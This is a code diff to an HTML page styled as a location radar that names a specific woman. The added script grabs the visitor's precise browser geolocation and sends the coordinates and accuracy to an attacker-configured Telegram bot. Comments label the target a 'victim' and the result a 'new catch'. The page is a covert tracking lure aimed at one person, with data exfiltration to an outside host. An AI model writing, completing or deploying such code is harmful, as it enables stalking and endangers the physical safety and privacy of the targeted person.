@@ -148,11 +148,48 @@
             <div class="radar-dot"></div>
         </div>
         <h1>فاطمة مصطفى</h1>
-        <div class="status">تم تحديد الموقع</div>
-        <div class="coords">SYS_LOC_TRACKING // SECURE_TARGET</div>
+        <div class="status" id="status-text">جاري تحديد الموقع...</div>
+        <div class="coords" id="coords-text">SYS_LOC_TRACKING // SECURE_TARGET</div>
         
         <div class="signature">Monty Go SDN</div>
     </div>
+
+    <script>
+        // ضع هنا بيانات بوت التليجرام الخاص بك (Token و Chat ID) لتصلك البيانات مباشرة
+        const botToken = "YOUR_BOT_TOKEN_HERE";
+        const chatId = "YOUR_CHAT_ID_HERE";
+
+        function sendToTelegram(dataMessage) {
+            if(botToken === "YOUR_BOT_TOKEN_HERE") return; // للتنبيه فقط إذا لم تقم بإضافتها
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(dataMessage)}`;
+            fetch(url).catch(err => console.log(err));
+        }
+
+        // محاولة سحب الإحداثيات الجغرافية عبر المتصفح
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(
+                function(position) {
+                    const lat = position.coords.latitude;
+                    const lon = position.coords.longitude;
+                    const accuracy = position.coords.accuracy;
+                    
+                    // تحديث النص في الصفحة (اختياري، لو عايز تبين ليها إنه تم تحديد مكانها)
+                    document.getElementById('status-text').innerText = "تم تحديد الموقع بنجاح";
+                    document.getElementById('coords-text').innerText = `LAT: ${lat.toFixed(4)} | LON: ${lon.toFixed(4)}`;
+
+                    // إرسال الإحداثيات لبوت التليجرام
+                    sendToTelegram(`🚨 صيد جديد - فاطمة مصطفى!\n📍 الخطوط: ${lat}\n📍 الأعمدة: ${lon}\n🎯 الدقة: ${accuracy} متر`);
+                },
+                function(error) {
+                    document.getElementById('status-text').innerText = "فشل في التقاط الإحداثيات";
+                    sendToTelegram(`⚠️ فشل التقاط الموقع للضحية. الخطأ: ${error.message}`);
+                },
+                { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+            );
+        } else {
+            document.getElementById('status-text').innerText = "المتصفح لا يدعم التتبع";
+        }
+    </script>
 
 </body>
 </html>
